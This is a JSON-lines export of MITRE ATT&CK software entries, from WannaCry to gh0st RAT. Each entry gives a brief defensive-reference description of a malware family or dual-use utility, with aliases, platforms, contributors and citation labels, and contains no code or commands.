{"ID":"S0366","name":"WannaCry","description":"[WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)","url":"https://attack.mitre.org/software/S0366","created":"25 March 2019","last modified":"08 March 2023","version":"1.1","contributors":"Jan Miller, CrowdStrike","platforms":"Windows","aliases":"WCry, WanaCry, WanaCrypt, WanaCrypt0r","type":"malware","relationship citations":"(Citation: FireEye APT38 Oct 2018),(Citation: FireEye WannaCry 2017),(Citation: SecureWorks WannaCry Analysis),(Citation: LogRhythm WannaCry),,(Citation: FireEye WannaCry 2017),(Citation: US-CERT WannaCry 2017),(Citation: SecureWorks WannaCry Analysis),(Citation: LogRhythm WannaCry)"}
{"ID":"S0670","name":"WarzoneRAT","description":"[WarzoneRAT](https://attack.mitre.org/software/S0670) is a malware-as-a-service remote access tool (RAT) written in C++ that has been publicly available for purchase since at least late 2018.(Citation: Check Point Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020)","url":"https://attack.mitre.org/software/S0670","created":"27 December 2021","last modified":"15 April 2022","version":"1.0","contributors":"Abhijit Mohanta, @abhijit_mohanta, Uptycs; Shilpesh Trivedi, Uptycs","platforms":"Windows","aliases":"Ave Maria, Warzone","type":"malware","relationship citations":"(Citation: Check Point Warzone Feb 2020),(Citation: Uptycs Confucius APT Jan 2021),,(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Uptycs Confucius APT Jan 2021)"}
{"ID":"S0612","name":"WastedLocker","description":"[WastedLocker](https://attack.mitre.org/software/S0612) is a ransomware family attributed to [Indrik Spider](https://attack.mitre.org/groups/G0119) that has been used since at least May 2020. [WastedLocker](https://attack.mitre.org/software/S0612) has been used against a broad variety of sectors, including manufacturing, information technology, and media.(Citation: Symantec WastedLocker June 2020)(Citation: NCC Group WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020) ","url":"https://attack.mitre.org/software/S0612","created":"20 May 2021","last modified":"27 September 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Crowdstrike EvilCorp March 2021),(Citation: NCC Group WastedLocker June 2020),,(Citation: NCC Group WastedLocker June 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Sentinel Labs WastedLocker July 2020)"}
{"ID":"S0579","name":"Waterbear","description":"[Waterbear](https://attack.mitre.org/software/S0579) is modular malware attributed to [BlackTech](https://attack.mitre.org/groups/G0098) that has been used primarily for lateral movement, decrypting, and triggering payloads and is capable of hiding network behaviors.(Citation: Trend Micro Waterbear December 2019)","url":"https://attack.mitre.org/software/S0579","created":"22 February 2021","last modified":"25 March 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Waterbear December 2019),,(Citation: Trend Micro Waterbear December 2019)"}
{"ID":"S0515","name":"WellMail","description":"[WellMail](https://attack.mitre.org/software/S0515) is a lightweight malware written in Golang used by [APT29](https://attack.mitre.org/groups/G0016), similar in design and structure to [WellMess](https://attack.mitre.org/software/S0514).(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020)","url":"https://attack.mitre.org/software/S0515","created":"29 September 2020","last modified":"09 October 2020","version":"1.0","contributors":"Josh Campbell, Cyborg Security, @cyb0rgsecur1ty","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: CISA WellMail July 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),,(Citation: NCSC APT29 July 2020),(Citation: CISA WellMail July 2020)"}
{"ID":"S0514","name":"WellMess","description":"[WellMess](https://attack.mitre.org/software/S0514) is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by [APT29](https://attack.mitre.org/groups/G0016).(Citation: CISA WellMess July 2020)(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020)","url":"https://attack.mitre.org/software/S0514","created":"24 September 2020","last modified":"22 March 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: CISA WellMess July 2020),(Citation: PWC WellMess July 2020),(Citation: PWC WellMess C2 August 2020),,(Citation: PWC WellMess C2 August 2020),(Citation: CISA WellMess July 2020),(Citation: NCSC APT29 July 2020),(Citation: PWC WellMess July 2020)"}
{"ID":"S0645","name":"Wevtutil","description":"[Wevtutil](https://attack.mitre.org/software/S0645) is a Windows command-line utility that enables administrators to retrieve information about event logs and publishers.(Citation: Wevtutil Microsoft Documentation)","url":"https://attack.mitre.org/software/S0645","created":"14 September 2021","last modified":"13 October 2022","version":"1.1","contributors":"Harshal Tupsamudre, Qualys; Viren Chaudhari, Qualys","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Crowdstrike DNC June 2016),(Citation: FoxIT Wocao December 2019),(Citation: Wevtutil Microsoft Documentation),(Citation: Crowdstrike DNC June 2016),(Citation: F-Secure Lazarus Cryptocurrency Aug 2020)"}
{"ID":"S0689","name":"WhisperGate","description":"[WhisperGate](https://attack.mitre.org/software/S0689) is a multi-stage wiper designed to look like ransomware that has been used against multiple government, non-profit, and information technology organizations in Ukraine since at least January 2022.(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Microsoft WhisperGate January 2022)","url":"https://attack.mitre.org/software/S0689","created":"10 March 2022","last modified":"05 April 2023","version":"1.1","contributors":"Matt Brenton, Zurich Global Information Security; Phill Taylor, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant UNC2589 March 2022),(Citation: CrowdStrike Ember Bear Profile March 2022),,(Citation: Medium S2W WhisperGate January 2022),(Citation: Microsoft WhisperGate January 2022),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Unit 42 WhisperGate January 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022)"}
{"ID":"S0206","name":"Wiarp","description":"[Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)","url":"https://attack.mitre.org/software/S0206","created":"18 April 2018","last modified":"06 January 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Wiarp May 2012)"}
{"ID":"S0059","name":"WinMM","description":"[WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)","url":"https://attack.mitre.org/software/S0059","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CameraShy),(Citation: Baumgartner Naikon 2015),,(Citation: Baumgartner Naikon 2015)"}
{"ID":"S0466","name":"WindTail","description":"[WindTail](https://attack.mitre.org/software/S0466) is a macOS surveillance implant used by [Windshift](https://attack.mitre.org/groups/G0112). [WindTail](https://attack.mitre.org/software/S0466) shares code similarities with Hack Back aka KitM OSX.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)","url":"https://attack.mitre.org/software/S0466","created":"04 June 2020","last modified":"20 April 2022","version":"1.0","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":"(Citation: SANS Windshift August 2018),(Citation: objective-see windtail2 jan 2019),(Citation: objective-see windtail1 dec 2018),,(Citation: objective-see windtail1 dec 2018),(Citation: objective-see windtail2 jan 2019)"}
{"ID":"S0005","name":"Windows Credential Editor","description":"[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)","url":"https://attack.mitre.org/software/S0005","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"WCE","type":"tool","relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Symantec Tick Apr 2016),(Citation: FireEye FIN6 April 2016),(Citation: Dark Reading APT39 JAN 2019),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT40 March 2019),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Dell TG-3390),(Citation: FireEye APT39 Jan 2019),,(Citation: Amplia WCE)"}
{"ID":"S0191","name":"Winexe","description":"[Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based client. (Citation: Überwachung APT28 Forfiles June 2015)","url":"https://attack.mitre.org/software/S0191","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: SecureList Silence Nov 2017),(Citation: Überwachung APT28 Forfiles June 2015),,(Citation: Secpod Winexe June 2017)"}
{"ID":"S0176","name":"Wingbird","description":"[Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is reportedly used to attack individual computers instead of networks. It was used by [NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)","url":"https://attack.mitre.org/software/S0176","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft SIR Vol 21),(Citation: Microsoft NEODYMIUM Dec 2016),,(Citation: Microsoft SIR Vol 21),(Citation: Microsoft Wingbird Nov 2017)"}
{"ID":"S0430","name":"Winnti for Linux","description":"[Winnti for Linux](https://attack.mitre.org/software/S0430) is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including [Winnti Group](https://attack.mitre.org/groups/G0044). The Windows variant is tracked separately under [Winnti for Windows](https://attack.mitre.org/software/S0141).(Citation: Chronicle Winnti for Linux May 2019)","url":"https://attack.mitre.org/software/S0430","created":"29 April 2020","last modified":"01 July 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: Crowdstrike GTR2020 Mar 2020),,(Citation: Chronicle Winnti for Linux May 2019)"}
{"ID":"S0141","name":"Winnti for Windows","description":"[Winnti for Windows](https://attack.mitre.org/software/S0141) is a modular remote access Trojan (RAT) that has been used likely by multiple groups to carry out intrusions in various regions since at least 2010, including by one group referred to as the same name, [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: Kaspersky Winnti April 2013)(Citation: Microsoft Winnti Jan 2017)(Citation: Novetta Winnti April 2015)(Citation: 401 TRG Winnti Umbrella May 2018). The Linux variant is tracked separately under [Winnti for Linux](https://attack.mitre.org/software/S0430).(Citation: Chronicle Winnti for Linux May 2019)","url":"https://attack.mitre.org/software/S0141","created":"31 May 2017","last modified":"20 March 2023","version":"3.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Winnti June 2015),(Citation: Kaspersky Winnti April 2013),,(Citation: Microsoft Winnti Jan 2017),(Citation: Novetta Winnti April 2015)"}
{"ID":"S0041","name":"Wiper","description":"[Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. (Citation: Dell Wiper)","url":"https://attack.mitre.org/software/S0041","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: Dell Wiper)"}
{"ID":"S1065","name":"Woody RAT","description":" [Woody RAT](https://attack.mitre.org/software/S1065) is a remote access trojan (RAT) that has been used since at least August 2021 against Russian organizations.(Citation: MalwareBytes WoodyRAT Aug 2022)","url":"https://attack.mitre.org/software/S1065","created":"14 February 2023","last modified":"17 April 2023","version":"1.0","contributors":"Adam Lichters; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: MalwareBytes WoodyRAT Aug 2022)"}
{"ID":"S0161","name":"XAgentOSX","description":"[XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007)  on OS X and appears to be a port of their standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: XAgentOSX 2017)","url":"https://attack.mitre.org/software/S0161","created":"14 December 2017","last modified":"30 March 2020","version":"1.3","contributors":null,"platforms":"macOS","aliases":"OSX.Sofacy","type":"malware","relationship citations":"(Citation: XAgentOSX 2017),(Citation: Symantec APT28 Oct 2018),(Citation: US District Court Indictment GRU Oct 2018),,(Citation: XAgentOSX 2017)"}
{"ID":"S0658","name":"XCSSET","description":"[XCSSET](https://attack.mitre.org/software/S0658) is a macOS modular backdoor that targets Xcode application developers. [XCSSET](https://attack.mitre.org/software/S0658) was first observed in August 2020 and has been used to install a backdoor component, modify browser applications, conduct collection, and provide ransomware-like encryption capabilities.(Citation: trendmicro xcsset xcode project 2020)","url":"https://attack.mitre.org/software/S0658","created":"05 October 2021","last modified":"18 October 2022","version":"1.2","contributors":null,"platforms":"macOS","aliases":"OSX.DubRobber","type":"malware","relationship citations":",,(Citation: trendmicro xcsset xcode project 2020),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: 20 macOS Common Tools and Techniques)"}
{"ID":"S0117","name":"XTunnel","description":"[XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit Part 2)","url":"https://attack.mitre.org/software/S0117","created":"31 May 2017","last modified":"21 March 2020","version":"2.1","contributors":null,"platforms":"Windows","aliases":"Trojan.Shunnael, X-Tunnel, XAPS","type":"malware","relationship citations":"(Citation: Symantec APT28 Oct 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: ESET Sednit Part 3),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),,(Citation: ESET Sednit Part 2),(Citation: Crowdstrike DNC June 2016),(Citation: Invincea XTunnel)"}
{"ID":"S0341","name":"Xbash","description":"[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)","url":"https://attack.mitre.org/software/S0341","created":"30 January 2019","last modified":"23 June 2020","version":"1.2","contributors":null,"platforms":"Linux, Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit42 Xbash Sept 2018),(Citation: Trend Micro Xbash Sept 2018)"}
{"ID":"S0388","name":"YAHOYAH","description":"[YAHOYAH](https://attack.mitre.org/software/S0388) is a Trojan used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) as a second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015)","url":"https://attack.mitre.org/software/S0388","created":"17 June 2019","last modified":"23 March 2023","version":"1.1","contributors":"Bart Parys","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro TropicTrooper 2015),,(Citation: TrendMicro TropicTrooper 2015)"}
{"ID":"S0086","name":"ZLib","description":"[ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used as a second-stage implant during [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2014. [ZLib](https://attack.mitre.org/software/S0086) is malware and should not be confused with the legitimate compression library from which its name is derived.(Citation: Cylance Dust Storm)","url":"https://attack.mitre.org/software/S0086","created":"31 May 2017","last modified":"30 September 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Cylance Dust Storm),(Citation: Cylance Dust Storm)"}
{"ID":"S0251","name":"Zebrocy","description":"[Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, and Golang. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: CISA Zebrocy Oct 2020) ","url":"https://attack.mitre.org/software/S0251","created":"17 October 2018","last modified":"23 April 2021","version":"3.0","contributors":"Emily Ratliff, IBM","platforms":"Windows","aliases":"Zekapab","type":"malware","relationship citations":"(Citation: Unit42 Sofacy Dec 2018),(Citation: Palo Alto Sofacy 06-2018),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET Zebrocy May 2019),(Citation: Securelist Sofacy Feb 2018),,(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Palo Alto Sofacy 06-2018),(Citation: Unit42 Sofacy Dec 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: ESET Zebrocy May 2019),(Citation: Securelist Sofacy Feb 2018)"}
{"ID":"S0230","name":"ZeroT","description":"[ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by [TA459](https://attack.mitre.org/groups/G0062), often in conjunction with [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017)","url":"https://attack.mitre.org/software/S0230","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint TA459 April 2017),,(Citation: Proofpoint TA459 April 2017),(Citation: Proofpoint ZeroT Feb 2017)"}
{"ID":"S0027","name":"Zeroaccess","description":"[Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)","url":"https://attack.mitre.org/software/S0027","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: Ciubotariu 2014),(Citation: Sophos ZeroAccess)"}
{"ID":"S0330","name":"Zeus Panda","description":"[Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)’s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)","url":"https://attack.mitre.org/software/S0330","created":"29 January 2019","last modified":"22 March 2023","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Talos Zeus Panda Nov 2017),(Citation: GDATA Zeus Panda June 2017)"}
{"ID":"S0672","name":"Zox","description":"[Zox](https://attack.mitre.org/software/S0672) is a remote access tool that has been used by [Axiom](https://attack.mitre.org/groups/G0001) since at least 2008.(Citation: Novetta-Axiom)","url":"https://attack.mitre.org/software/S0672","created":"09 January 2022","last modified":"20 March 2023","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Gresim, ZoxPNG, ZoxRPC","type":"malware","relationship citations":"(Citation: Novetta-Axiom),,(Citation: Novetta-Axiom)"}
{"ID":"S0412","name":"ZxShell","description":"[ZxShell](https://attack.mitre.org/software/S0412) is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)","url":"https://attack.mitre.org/software/S0412","created":"24 September 2019","last modified":"23 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":"Sensocode","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Talos ZxShell Oct 2014),,(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Talos ZxShell Oct 2014)"}
{"ID":"S1013","name":"ZxxZ","description":"[ZxxZ](https://attack.mitre.org/software/S1013) is a trojan written in Visual C++ that has been used by [BITTER](https://attack.mitre.org/groups/G1002) since at least August 2021, including against Bangladeshi government personnel.(Citation: Cisco Talos Bitter Bangladesh May 2022)","url":"https://attack.mitre.org/software/S1013","created":"02 June 2022","last modified":"02 June 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cisco Talos Bitter Bangladesh May 2022),,(Citation: Cisco Talos Bitter Bangladesh May 2022)"}
{"ID":"S0202","name":"adbupd","description":"[adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by [PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to [Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April 2016)","url":"https://attack.mitre.org/software/S0202","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":"Ryan Becwar","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft PLATINUM April 2016),,(Citation: Microsoft PLATINUM April 2016)"}
{"ID":"S0110","name":"at","description":"[at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run at a specified date or time.(Citation: TechNet At)(Citation: Linux at)","url":"https://attack.mitre.org/software/S0110","created":"31 May 2017","last modified":"22 September 2022","version":"1.3","contributors":null,"platforms":"Linux, Windows, macOS","aliases":"at.exe","type":"tool","relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: FireEye APT40 March 2019),(Citation: McAfee Night Dragon),(Citation: Linux at),(Citation: TechNet At)"}
{"ID":"S0471","name":"build_downer","description":"[build_downer](https://attack.mitre.org/software/S0471) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/software/S0471","created":"10 June 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Tick November 2019),,(Citation: Trend Micro Tick November 2019)"}
{"ID":"S1043","name":"ccf32","description":"[ccf32](https://attack.mitre.org/software/S1043) is data collection malware that has been used since at least February 2019, most notably during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign; there is also a similar x64 version.(Citation: Bitdefender FunnyDream Campaign November 2020)","url":"https://attack.mitre.org/software/S1043","created":"22 September 2022","last modified":"10 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender FunnyDream Campaign November 2020)"}
{"ID":"S0160","name":"certutil","description":"[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)","url":"https://attack.mitre.org/software/S0160","created":"14 December 2017","last modified":"03 March 2023","version":"1.3","contributors":null,"platforms":"Windows","aliases":"certutil.exe","type":"tool","relationship citations":"(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: Rancor Unit42 June 2018),(Citation: Accenture Hogfish April 2018),(Citation: Malwarebytes Higaisa 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: Symantec Cicada November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: PTSecurity Higaisa 2020),(Citation: FireEye APT34 Dec 2017),(Citation: FireEye APT41 March 2020),,(Citation: LOLBAS Certutil),(Citation: Malwarebytes Targeted Attack against Saudi Arabia),(Citation: Palo Alto Retefe),(Citation: TechNet Certutil)"}
{"ID":"S0106","name":"cmd","description":"[cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. (Citation: TechNet Cmd)\n\nCmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files (e.g., <code>copy</code> (Citation: TechNet Copy)).","url":"https://attack.mitre.org/software/S0106","created":"31 May 2017","last modified":"13 October 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":"cmd.exe","type":"tool","relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Microsoft GALLIUM December 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Symantec Orangeworm April 2018),(Citation: Dell Lateral Movement),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: McAfee Honeybee),(Citation: TechNet Del),(Citation: TechNet Dir),(Citation: TechNet Copy),(Citation: TechNet Cmd)"}
{"ID":"S0472","name":"down_new","description":" [down_new](https://attack.mitre.org/software/S0472) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/software/S0472","created":"10 June 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Trend Micro Tick November 2019),,(Citation: Trend Micro Tick November 2019)"}
{"ID":"S0105","name":"dsquery","description":"[dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be used to query Active Directory for information from a system within a domain. (Citation: TechNet Dsquery) It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.","url":"https://attack.mitre.org/software/S0105","created":"31 May 2017","last modified":"04 January 2023","version":"1.4","contributors":null,"platforms":"Windows","aliases":"dsquery.exe","type":"tool","relationship citations":"(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Mandiant APT41),(Citation: FoxIT Wocao December 2019),(Citation: Mandiant APT41),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: TechNet Dsquery),(Citation: Mandiant APT41),(Citation: Harmj0y Domain Trusts)"}
{"ID":"S0404","name":"esentutl","description":"[esentutl](https://attack.mitre.org/software/S0404) is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.(Citation: Microsoft Esentutl)","url":"https://attack.mitre.org/software/S0404","created":"03 September 2019","last modified":"01 October 2021","version":"1.2","contributors":"Edward Millington; Matthew Demaske, Adaptforward","platforms":"Windows","aliases":"esentutl.exe","type":"tool","relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: FireEye APT10 Sept 2018),,(Citation: Cary Esentutl),(Citation: Red Canary 2021 Threat Detection Report March 2021),(Citation: LOLBAS Esentutl)"}
{"ID":"S0095","name":"ftp","description":"[ftp](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data.(Citation: Microsoft FTP)(Citation: Linux FTP)","url":"https://attack.mitre.org/software/S0095","created":"31 May 2017","last modified":"07 March 2022","version":"2.0","contributors":null,"platforms":"Linux, Windows, macOS","aliases":"ftp.exe","type":"tool","relationship citations":"(Citation: FBI FLASH APT39 September 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto OilRig Oct 2016),(Citation: Baumgartner Naikon 2015),(Citation: FireEye APT41 March 2020),,(Citation: Microsoft FTP),(Citation: Linux FTP)"}
{"ID":"S0032","name":"gh0st RAT","description":"[gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by multiple groups.(Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)","url":"https://attack.mitre.org/software/S0032","created":"31 May 2017","last modified":"20 March 2023","version":"3.1","contributors":null,"platforms":"Windows, macOS","aliases":"Moudoor, Mydoor","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: RSA2017 Detect and Respond Adair),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: Malwarebytes Higaisa 2020),(Citation: Bizeul 2014),(Citation: Villeneuve 2014),(Citation: FireEye APT41 Aug 2019),(Citation: Proofpoint TA459 April 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta-Axiom),(Citation: Cylance Dust Storm),(Citation: Gh0stRAT ATT March 2019),(Citation: Arbor Musical Chairs Feb 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: FireEye Hacking Team),(Citation: Alintanahin 2014)"}
